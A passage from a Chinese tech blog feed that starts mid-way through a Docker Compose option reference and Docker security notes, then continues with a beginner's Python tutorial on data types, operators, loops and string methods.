<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**expose**</span><br></pre></td></tr></table></figure>

<p>暴露端口，但不映射到宿主机，只被连接的服务访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">expose:</span><br><span class="line"> - &quot;3000&quot;</span><br><span class="line"> - &quot;8000&quot;</span><br></pre></td></tr></table></figure>

<p><strong><code>volumes</code></strong></p>
<p>卷挂载路径设置。可以设置宿主机路径 （<code>HOST:CONTAINER</code>） 或加上访问模式 （<code>HOST:CONTAINER:ro</code>）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volumes:</span><br><span class="line"> - /var/lib/mysql</span><br><span class="line"> - cache/:/tmp/cache</span><br><span class="line"> - ~/configs:/etc/configs/:ro</span><br></pre></td></tr></table></figure>

<p>**<br>**</p>
<p><strong><code>volumes_from</code></strong></p>
<p>从另一个服务或容器挂载它的所有卷。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">volumes_from:</span><br><span class="line"> - service_name</span><br><span class="line"> - container_name</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">environment</span><br></pre></td></tr></table></figure>

<p>设置环境变量。你可以使用数组或字典两种格式。</p>
<p>只给定名称的变量会自动获取它在 Compose 主机上的值，可以用来防止泄露不必要的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">environment:</span><br><span class="line">  RACK_ENV: development</span><br><span class="line">  SESSION_SECRET:</span><br><span class="line">environment:</span><br><span class="line">  - RACK_ENV=development</span><br><span class="line">  - SESSION_SECRET</span><br></pre></td></tr></table></figure>



<p><strong><code>env_file</code></strong></p>
<p>从文件中获取环境变量，可以为单独的文件路径或列表。</p>
<p>如果通过 <code>docker-compose -f FILE</code> 指定了模板文件，则 <code>env_file</code> 中路径会基于模板文件路径。</p>
<p>如果有变量名称与 <code>environment</code> 指令冲突，则以后者为准。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env_file: .env</span><br><span class="line">env_file:</span><br><span class="line">  - ./common.env</span><br><span class="line">  - ./apps/web.env</span><br><span class="line">  - /opt/secrets.env</span><br></pre></td></tr></table></figure>

<p>环境变量文件中每一行必须符合格式，支持 <code>#</code> 开头的注释行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># common.env: Set Rails/Rack environment</span><br><span class="line">RACK_ENV=development</span><br></pre></td></tr></table></figure>



<p><strong><code>extends</code></strong></p>
<p>基于已有的服务进行扩展。例如我们已经有了一个 webapp 服务，模板文件为 <code>common.yml</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># common.yml</span><br><span class="line">webapp:</span><br><span class="line">  build: ./webapp</span><br><span class="line">  environment:</span><br><span class="line">    - DEBUG=false</span><br><span class="line">    - SEND_EMAILS=false</span><br></pre></td></tr></table></figure>

<p>编写一个新的 <code>development.yml</code> 文件，使用 <code>common.yml</code> 中的 webapp 服务进行扩展。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># development.yml</span><br><span class="line">web:</span><br><span class="line">  extends:</span><br><span class="line">    file: common.yml</span><br><span class="line">    service: webapp</span><br><span class="line">  ports:</span><br><span class="line">    - &quot;8000:8000&quot;</span><br><span class="line">  links:</span><br><span class="line">    - db</span><br><span class="line">  environment:</span><br><span class="line">    - DEBUG=true</span><br><span class="line">db:</span><br><span class="line">  image: postgres</span><br></pre></td></tr></table></figure>

<p>后者会自动继承 common.yml 中的 webapp 服务及相关环节变量。</p>
<p>**<br>**</p>
<p><strong><code>net</code></strong></p>
<p>设置网络模式。使用和 <code>docker client</code> 的 <code>--net</code> 参数一样的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net: &quot;bridge&quot;</span><br><span class="line">net: &quot;none&quot;</span><br><span class="line">net: &quot;container:[name or id]&quot;</span><br><span class="line">net: &quot;host&quot;</span><br></pre></td></tr></table></figure>

<p>**<br>**</p>
<p><strong><code>pid</code></strong></p>
<p>跟主机系统共享进程命名空间。打开该选项的容器可以相互通过进程 ID 来访问和操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pid: &quot;host&quot;</span><br></pre></td></tr></table></figure>



<p><strong><code>dns</code></strong></p>
<p>配置 DNS 服务器。可以是一个值，也可以是一个列表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns: 8.8.8.8</span><br><span class="line">dns:</span><br><span class="line">  - 8.8.8.8</span><br><span class="line">  - 9.9.9.9</span><br></pre></td></tr></table></figure>



<p><strong><code>cap_add, cap_drop</code></strong></p>
<p>添加或放弃容器的 Linux 能力（Capabiliity）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cap_add:</span><br><span class="line">  - ALL</span><br><span class="line">cap_drop:</span><br><span class="line">  - NET_ADMIN</span><br><span class="line">  - SYS_ADMIN</span><br></pre></td></tr></table></figure>

<p>**<br>**</p>
<p><strong><code>dns_search</code></strong></p>
<p>配置 DNS 搜索域。可以是一个值，也可以是一个列表。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">dns_search:</span> <span class="string">example.com</span></span><br><span class="line"><span class="attr">dns_search:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">domain1.example.com</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">domain2.example.com</span></span><br></pre></td></tr></table></figure>

<p>**<br>**</p>
<p><strong><code>working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares</code></strong></p>
<p>这些都是和 <code>docker run</code> 支持的选项类似。</p>
<h2 id="八、安全"><a href="#八、安全" class="headerlink" title="八、安全"></a>八、安全</h2><h3 id="8-1-内核命名空间"><a href="#8-1-内核命名空间" class="headerlink" title="8.1 内核命名空间"></a>8.1 内核命名空间</h3><p>当使用 <code>docker run</code> 启动一个容器时，在后台 Docker 为容器创建一个独立的命名空间和控制集合。命名空间踢空了最基础的也是最直接的隔离，在容器中运行的进程不会被运行在主机上的进程和其他容器发现和作用。</p>
<h3 id="8-2-控制组"><a href="#8-2-控制组" class="headerlink" title="8.2 控制组"></a>8.2 控制组</h3><p>控制组是 Linux 容器机制的另一个关键组件，负责实现资源的审计和限制。</p>
<p>它提供了很多特性，确保哥哥容器可以公平地分享主机的内存、CPU、磁盘IO等资源；当然，更重要的是，控制组确保了当容器内的资源使用产生压力时不会连累主机系统。</p>
<h3 id="8-3-内核能力机制"><a href="#8-3-内核能力机制" class="headerlink" title="8.3 内核能力机制"></a>8.3 内核能力机制</h3><p>能力机制是 Linux 内核的一个强大特性，可以提供细粒度的权限访问控制。 可以作用在进程上，也可以作用在文件上。</p>
<p>例如一个服务需要绑定低于 1024 的端口权限，并不需要 root 权限，那么它只需要被授权 <code>net_bind_service</code> 能力即可。</p>
<p>默认情况下， Docker 启动的容器被严格限制只允许使用内核的一部分能力。</p>
<p>使用能力机制加强 Docker 容器的安全有很多好处，可以按需分配给容器权限，这样，即便攻击者在容器中取得了 root 权限，也不能获取宿主机较高权限，能进行的破坏也是有限的。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://docs.docker.com/engine/reference/commandline/images/">https://docs.docker.com/engine/reference/commandline/images/</a></p>
<p><a href="http://www.dockerinfo.net/">http://www.dockerinfo.net/</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>运维</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>python_汇总</title>
    <url>/2.python/python%20%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="Python基础"><a href="#Python基础" class="headerlink" title="Python基础"></a>Python基础</h1><p>注释</p>
<p>输出语句</p>
<p>变量</p>
<p>标识符</p>
<p>数据类型</p>
<p>用户输入</p>
<p>类型转换</p>
<p>运算符</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>使用自己语言描述代码的功能 不属于程序  只是给使用者解读使用</p>
<p>注释有两种：  </p>
<p>单行注释  # 注释内容</p>
<p>多行注释 ‘’’注释的内容‘’‘</p>
<h3 id="输出语句"><a href="#输出语句" class="headerlink" title="输出语句"></a>输出语句</h3><p>print – 输出语句 将内容输出给用户查看的 封装的是打印功能</p>
<p>函数 print()</p>
<p>print函数的格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">*args <span class="comment"># 表示的是输出的内容，输出内容可以是一个也可以是多个 每个内容之间使用逗号隔开</span></span><br><span class="line">sep=<span class="string">&#x27; &#x27;</span> <span class="comment"># 多个内容之间的分隔符 默认是空格</span></span><br><span class="line">end=<span class="string">&#x27;\n&#x27;</span> <span class="comment"># 输出语句的结束语  \n 换行 \t 制表符 </span></span><br><span class="line">file=<span class="literal">None</span> <span class="comment"># 将输出的内容指定的文件中</span></span><br><span class="line"><span class="comment"># 扩展知识：文件写入</span></span><br><span class="line"><span class="comment"># 指定打开文件 open(&#x27;文件路径&#x27;,&#x27;打开的模式&#x27;)</span></span><br><span class="line"><span class="comment"># 打开的模式  r 读取内容 w 写入内容</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量的官方概念：变量是用来存储数据的，以便后期的使用和修改</p>
<p>name = “张三”   变量还提供一个为数据标记描述性的名字【变量名】，我们可以在程序中根据这个名字能更好得阅读和理解该变量的作用，要注意取名称时要“见名知意”</p>
<p>简单理解：变量就是一个存储数据的容器</p>
<p>声明变量的方式：</p>
<p>变量名 = 数据  例如;a = 11</p>
<p>一次声明多个：变量名1,变量名2 = 数据1，数据2 例如：a,b=1,2</p>
<p>注意：变量在使用之前一定要先声明，并且进行初始化赋值</p>
<p>没有加双引号或者单引号 代表数值   加了的叫字符串</p>
<h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>用于程序中自定义名字的规范</p>
<p>标识符的组成：英文字母、数字、下划线</p>
<p>自定义名称的时候要注意：</p>
<p>1.不能以数字开头  2.不能使用Python的关键字【变了颜色的不要用】</p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>变量是用来存储数据  数据的格式是多样化</p>
<p>变量对应的数据类型是根据赋予的值来确定的</p>
<h3 id="数值类型："><a href="#数值类型：" class="headerlink" title="数值类型："></a>数值类型：</h3><h4 id="整型-：-int"><a href="#整型-：-int" class="headerlink" title="整型 ： int"></a>整型 ： int</h4><p>python2.x中整型有两种 int 和 long</p>
<p>int 内存大小 4位  4bit   long  8B</p>
<p>python3.x以后只有int 具有long的性质</p>
<h4 id="浮点型-float"><a href="#浮点型-float" class="headerlink" title="浮点型 : float"></a>浮点型 : float</h4><p>用来存储小数的类型</p>
<h4 id="复数型-complex"><a href="#复数型-complex" class="headerlink" title="复数型 : complex"></a>复数型 : complex</h4><p>具有实部+虚部：3+4j</p>
<h4 id="布尔类型-bool"><a href="#布尔类型-bool" class="headerlink" title="布尔类型 : bool"></a>布尔类型 : bool</h4><p>描述状态的类型  值只有True和False 也可以使用1和0</p>
<h4 id="字符类型：str"><a href="#字符类型：str" class="headerlink" title="字符类型：str"></a>字符类型：str</h4><p>字符串类型的标识：使用单引号或者双引号包含单个字符或多个字符</p>
<h4 id="列表类型-：-list"><a href="#列表类型-：-list" class="headerlink" title="列表类型 ： list"></a>列表类型 ： list</h4><p>标识：[]</p>
<p>存放的是多个变量的容器</p>
<h4 id="元组类型-tuple"><a href="#元组类型-tuple" class="headerlink" title="元组类型 : tuple"></a>元组类型 : tuple</h4><p>标识：()</p>
<p>存放的是多个变量的容器</p>
<p>注意：和list的区别 list中的元素的值是可以变的   元组中的元素的值不可变的</p>
<p>共同点：添加在容器中的元素都有自己的编号，这个编号是从0开始  这个编号也称之为索引 或者 下标 、脚标</p>
<h4 id="字典类型-dict"><a href="#字典类型-dict" class="headerlink" title="字典类型 : dict"></a>字典类型 : dict</h4><p>标识：{}</p>
<p>存放的数据是用键值对的格式表示   键和值是一一对应的  根据键来查找值</p>
<p>要求：键是不允许重复的  必须唯一的</p>
<p>键的类型对应的数据是不可变的</p>
<p>字典的格式;{key:value,key1:value1…}</p>
<h4 id="集合类型-set"><a href="#集合类型-set" class="headerlink" title="集合类型 : set"></a>集合类型 : set</h4><p>把集合理解是存放字典key的容器</p>
<p>集合中的数据是不允许重复的  —- 用于排重    还排序</p>
<h4 id="空值类型-：None"><a href="#空值类型-：None" class="headerlink" title="空值类型 ：None"></a>空值类型 ：None</h4><p>只有一个值 None –代表状态是空</p>
<h3 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h3><p>input  封装用户输入的功能</p>
<p>格式： value = input(“提示用户输入语”)</p>
<p>在程序中使用input接受用户输入时 获得数据类型是字符串类型 str</p>
<p>python2.x 用户输入的是什么类型 在程序中接受的就是什么了类型</p>
<p>python3.x 用户不管你输入的是什么格式的数据 接受到的都是字符串类型</p>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>1.将对应的数据转换为整型    </p>
<p>格式：int(x)   — 将x这个数据转为整型</p>
<p>注意： 如果x的类型为字符串类型 需要保证x的数据值必须纯数字的 否则转换失败</p>
<p>2.将对应的数据转换为浮点类型</p>
<p>格式：float(x)  — 将x这个数据转为浮点类型</p>
<p>注意：如果x的类型为字符串类型 需要保证x的数据值除了点之外没有其他非数字符号 否则转换失败</p>
<p>3..将对应的数据转换为布尔类型</p>
<p>格式：bool(x) - – 将x这个数据转为布尔类型</p>
<p>注意;只有两个值 True False   1 和 0</p>
<p>4.将对应的数据转换为字符串</p>
<p>格式：str(x)  - – 将x这个数据转为字符类型</p>
<p>….</p>
<p>5.将字符(单个)转换为十进制</p>
<p>格式：ord(x)  - – 将字符换转为十进制</p>
<p>6.将对应的十进制转化为字符</p>
<p>格式：chr(x)  – - – 将x数据转换为字符串</p>
<p>7.将数据转换为二进制</p>
<p>bin(x)   – b </p>
<p>8.将数据转换为八进制</p>
<p>oct(x)   –o   0b00 0011</p>
<p>9.将数据转换为十六进制</p>
<p>hex(x)</p>
<p>10.将数据转换为列表</p>
<p>list(x)</p>
<p>11.将数据转换为元组</p>
<p>tuple(x)</p>
<p>12.将数据转换为字典</p>
<p>dict(x)</p>
<p>13.将数据转换为集合</p>
<p>set(x)</p>
<p>14.解析代码</p>
<p>eval(code)</p>
<p>代码是包含在字符串中的</p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>算术运算符 </p>
<p>关系运算符</p>
<p>逻辑运算符</p>
<p>成员运算符</p>
<p>身份运算符</p>
<p>位运算符</p>
<h2 id="注意：-提高优先级"><a href="#注意：-提高优先级" class="headerlink" title="注意：() 提高优先级"></a><strong>注意：() 提高优先级</strong></h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>+</p>
<p>-</p>
<p>*</p>
<p>/   </p>
<p>//  ：9 // 4   等于2</p>
<p>% ：取余数  </p>
<p>**  ：幂次方  str ** 2</p>
<h3 id="复合运算符"><a href="#复合运算符" class="headerlink" title="复合运算符"></a>复合运算符</h3><p>=  赋值运算符 </p>
<p>a = b   </p>
<p>a+=b  :   a=a+b </p>
<p>a/=b  : a= a/b</p>
<p>a*=b  : a=a*b</p>
<p>…..</p>
<h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><p>关系运算符运算之后的结果是bool类型</p>
<p>‘ &gt;       &lt;      &gt;=      &lt;=    =    != ’</p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>逻辑运算符两边的表达式都是bool类型， 运算的结果也是bool类型</p>
<p>逻辑与（and）:并且的关系   两边同时成立才位真    注：一假则全假</p>
<p>逻辑或（or）：或者的关系    一个结果成立 则结果成立  注：一真则全真</p>
<p>逻辑非（not）：假变真  真变假</p>
<p>注意：  not &gt; and &gt; or</p>
<h3 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h3><p>针对序列【字符串  列表  字典 集合..】而言的  </p>
<p>包含和不包含的关系</p>
<p>in</p>
<p>x in 序列  – 判断x是否包含在序列中</p>
<p>not in</p>
<p>x not in 序列 – 判断是否不包含在序列中</p>
<h3 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h3><p>两个变量的身份地址是否一致</p>
<p>id(x) – 获取变量的内存地址</p>
<p>is – 判断地址是否相同</p>
<p>id(x) == id(y)</p>
<p>is not – 判断地址是否不相同</p>
<p>id(x) ！= id(y)</p>
<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><p>使用的不多 — 针对二进制数的运算符</p>
<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h4 id="流程语句"><a href="#流程语句" class="headerlink" title="流程语句"></a>流程语句</h4><p>1.顺序语句：代码的执行流程 从上往下执行的</p>
<p>2.分支语句: 根据不同的情况出现不同的分支</p>
<p>3.循环语句：重复操作某一个事件 使用循环语句</p>
<h4 id="判断分支"><a href="#判断分支" class="headerlink" title="判断分支"></a>判断分支</h4><p>语文： 如果… 就…     映射到程序中</p>
<p>if  条件表达式：</p>
<p>缩进[通过tab键完成]  满足执行的条件的语句</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  if   如果.. 就...</span></span><br><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入您年龄:&quot;</span>))</span><br><span class="line"><span class="comment"># 判断</span></span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;小伙子 可以谈恋爱了&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>语文：如果…就… 否则…</p>
<p>if 条件表达式:</p>
<p>​      满足条件执行的操作</p>
<p>else:</p>
<p>​     不满足条件执行的操作</p>
<p>注：else后面不能添加条件表达式判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入您年龄:&quot;</span>))</span><br><span class="line"><span class="comment"># 判断</span></span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;小伙子 可以谈恋爱了&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>: <span class="comment">#  如果.. 就... 否则....</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;小朋友 你还小 回家做作业去&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>语文：排比句</p>
<p>如果…就..</p>
<p>否则如果…  就…</p>
<p>否则如果…  就…</p>
<p>否则如果…  就…</p>
<p>否则如果…  就…</p>
<p>否则…</p>
<p>格式：</p>
<p>if 条件表达式:</p>
<p>​      执行语句1</p>
<p>elif 条件表达式:</p>
<p>​     执行语句2</p>
<p>elif 条件表达式:</p>
<p>​     执行语句3</p>
<p>elif 条件表达式:</p>
<p>​     执行语句4</p>
<p>….</p>
<p>else:</p>
<p>​     执行语句</p>
<p>案例：</p>
<p>在控制台录入一个成绩，进行评定：</p>
<p>评定标准： &gt;=90  A         90&gt;x&gt;=80  B        &gt;=70 C        &gt;=60  D       其他 E</p>
<p>练习：</p>
<p>键盘录入年和月</p>
<p>要求输出对应月份的天数</p>
<p>月份：1 3 5 7 8 10 12 —————— 31</p>
<p>4 6 9 11 ———— 30</p>
<p>2 ———— 闰年 29    平年 28</p>
<h4 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h4><p>1.range方法 这个方法的作用 生成一个顺序序列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># range 方法</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">range  生成一个顺序的序列</span></span><br><span class="line"><span class="string">[stop] 接受结束值  从0开始到多少结束  [0,stop)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">res = <span class="built_in">range</span>(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(res) <span class="comment"># (0, 100)  序列</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把结果转换list 列表</span></span><br><span class="line">list0 = <span class="built_in">list</span>(res)</span><br><span class="line"><span class="built_in">print</span>(list0)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">range()</span></span><br><span class="line"><span class="string">start 起始值</span></span><br><span class="line"><span class="string">stop  结束值</span></span><br><span class="line"><span class="string">[, step]  步长 默认1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">res = <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(res)) <span class="comment">#  [1, 3, 5, 7, 9]</span></span><br><span class="line"></span><br><span class="line">res = <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">1</span>,-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(res)) (<span class="number">10.</span>。。。<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提供用户输入一个字符 输出十进制的值  # 97 a  65 A</span></span><br><span class="line">s =  <span class="built_in">input</span>(<span class="string">&quot;请输入一个字符:&quot;</span>)</span><br><span class="line"><span class="comment"># 转换为 ASCII</span></span><br><span class="line">value = <span class="built_in">ord</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 97 + 26 = 123</span></span><br><span class="line"><span class="keyword">if</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">124</span>):  <span class="comment"># 只判断a-z  范围 a-z</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<h4 id="循环结构语句"><a href="#循环结构语句" class="headerlink" title="循环结构语句"></a>循环结构语句</h4><p>循环：重复执行某个操作</p>
<p>Python中提供的循环机制：while 和 for in</p>
<p>在循环条件明确的时候 使用while循环</p>
<p>当遍历一个序列内容的时候  使用for in</p>
<p>while循环：</p>
<p>while 条件表达式：</p>
<p>​      重复的操作</p>
<p>当循环条件表达式成立的时候  才会执行重复的操作语句</p>
<p>循环的大致思路：</p>
<p>1.确定循环条件</p>
<p>2.确定重复的操作</p>
<p>案例：</p>
<p>输出1-10的数？</p>
<p>声明一个变量  记录数据  num = 1</p>
<p>确定循环的条件  变量最大10  num&lt;=10</p>
<p>确定要重复的操作：</p>
<p>输出操作</p>
<p>练习;</p>
<p>求1-10累计的和？</p>
<p>while的另外一种格式：</p>
<p>while 循环条件表达式：</p>
<p>​        循环操作</p>
<p>else:</p>
<p>​      循环条件不成立的时候执行</p>
<p>练习：求1-10偶数的和？  注：使用while循环</p>
<p>for in 循环：</p>
<p>for  变量  in  序列:</p>
<p>​      重复操作</p>
<h4 id="针对循环作用有两个关键字"><a href="#针对循环作用有两个关键字" class="headerlink" title="针对循环作用有两个关键字"></a>针对循环作用有两个关键字</h4><p>break     continue</p>
<p>break: 作用是 结束当前循环结构</p>
<p>遇见break 当前循环语句立即结束</p>
<p>continue</p>
<p>作用： 结束当前循环 继续下一次循环</p>
<p>遇见continue 结束当前次循环 回归到判定循环条件 继续下一次循环</p>
<p>在break和continue后不要直接跟平级的语句 因为这些语句永远不会被执行</p>
<h2 id="常用数据的类型的使用"><a href="#常用数据的类型的使用" class="headerlink" title="常用数据的类型的使用"></a>常用数据的类型的使用</h2><p>1.数值类型</p>
<p>2.字符串类型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;if123456789&quot;</span></span><br><span class="line"><span class="comment">#把字符串的第一个字符大写</span></span><br><span class="line"><span class="built_in">str</span>.capitalize()</span><br><span class="line"></span><br><span class="line"><span class="comment">#返回一个原字符串居中,并使用空格填充至长度 width 的新字符串 (填充的字符)</span></span><br><span class="line"><span class="built_in">str</span>.center()</span><br><span class="line"></span><br><span class="line"><span class="comment">#返回 str 在 string 里面出现的次数，如果 beg或者 end 指定则返回指定范围内 str 出现的次数</span></span><br><span class="line"><span class="built_in">str</span>.count(<span class="string">&quot;f&quot;</span>, beg=<span class="number">0</span>, end=<span class="built_in">len</span>(<span class="built_in">str</span>)) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False.</span></span><br><span class="line"><span class="built_in">str</span>.endswith(obj, beg=<span class="number">0</span>, end=<span class="built_in">len</span>(<span class="built_in">str</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8</span></span><br><span class="line"><span class="built_in">str</span>.expandtabs(tabsize=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#检测 str 是否包含在 string 中，如果 beg 和 end 指定范围，则检查是否包含在指定范围内，如果是返回开始的索引值，否则返回-1</span></span><br><span class="line">string.find(<span class="built_in">str</span>, beg=<span class="number">0</span>, end=<span class="built_in">len</span>(string))</span><br><span class="line"></span><br><span class="line"><span class="comment">#格式化字符串</span></span><br><span class="line">string.<span class="built_in">format</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#跟find()方法一样，只不过如果str不在 str中会报一个异常.</span></span><br><span class="line">string.index(<span class="built_in">str</span>, beg=<span class="number">0</span>, end=<span class="built_in">len</span>(string))</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果 string 至少有一个字符并且所有字符都是字母或数字则返回 True,否则返回 False</span></span><br><span class="line">string.isalnum()</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果 string 至少有一个字符并且所有字符都是字母则返回 True,否则返回 False</span></span><br><span class="line">string.isalpha()</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果 string 只包含数字则返回 True 否则返回 False.</span></span><br><span class="line">string.isdigit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果 string 中只包含数字字符，则返回 True，否则返回 False</span></span><br><span class="line">string.isnumeric()</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果 string 是标题化的(见 title())则返回 True，否则返回 False</span></span><br><span class="line">string.istitle()</span><br><span class="line"></span><br><span class="line"><span class="comment">#以 string 作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串</span></span><br><span class="line">string.join(seq)   </span><br><span class="line"></span><br><span class="line"><span class="comment">#以空格拼接字符串</span></span><br><span class="line"><span class="string">&quot; &quot;</span>.join(string)</span><br><span class="line"></span><br><span class="line"><span class="comment">#返回一个原字符串左对齐,并使用空格填充至长度width 的新字符串</span></span><br><span class="line"> string.ljust(width)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#转换 string 中所有大写字符为小写.  </span></span><br><span class="line">string.lower()</span><br><span class="line"></span><br><span class="line"><span class="comment">#返回字符串 str 中最大的字母。</span></span><br><span class="line"><span class="built_in">max</span>(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#返回字符串 str 中最小的字母。</span></span><br><span class="line"><span class="built_in">min</span>(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#把 string 中的 str1 替换成 str2,如果 num 指定，则替换不超过 num 次.</span></span><br><span class="line">string.replace(str1, str2,  num=string.count(str1))</span><br><span class="line"></span><br><span class="line"><span class="comment">#类似于 index()，不过是从右边开始.</span></span><br><span class="line">string.rindex( <span class="built_in">str</span>, beg=<span class="number">0</span>,end=<span class="built_in">len</span>(string))</span><br><span class="line"></span><br><span class="line"><span class="comment">#以 str 为分隔符切片 string，如果 num 有指定值，则仅分隔 num+1 个子字符串</span></span><br><span class="line">string.split(<span class="built_in">str</span>=<span class="string">&quot; &quot;</span>, num=string.count(<span class="built_in">str</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#按照行(&#x27;\r&#x27;, &#x27;\r\n&#x27;, \n&#x27;)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 </span></span><br><span class="line"><span class="comment">#False，不包含换行符，如果为 True，则保留换行符。</span></span><br><span class="line">string.splitlines([keepends])</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查字符串是否是以 obj 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，</span></span><br><span class="line"><span class="comment">#则在指定范围内检查.</span></span><br><span class="line">string.startswith(obj, beg=<span class="number">0</span>,end=<span class="built_in">len</span>(string))</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除字符串最后的字符</span></span><br><span class="line">string.strip([obj])</span><br><span class="line"></span><br><span class="line"><span class="comment">#转换 string 中的小写字母为大写</span></span><br><span class="line">string.upper()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="3-列表类型"><a href="#3-列表类型" class="headerlink" title="3.列表类型"></a>3.列表类型</h3><p>列表是python内置一种数据类型：list</p>
<p>list是一种有序的集合【插入顺序和显示的顺序是一致】</p>
<p>列表里的数据是可以随时增加以及删除和修改，添加的元素会自动添加编号，这个编号从0开始的</p>
<p>这个编号又称为下标（脚标 索引）</p>
<p>列表类型类似容器 可以存放多个变量</p>
<p>二维列表：在列表中的元素是列表  [[19,28],[22,33]]</p>
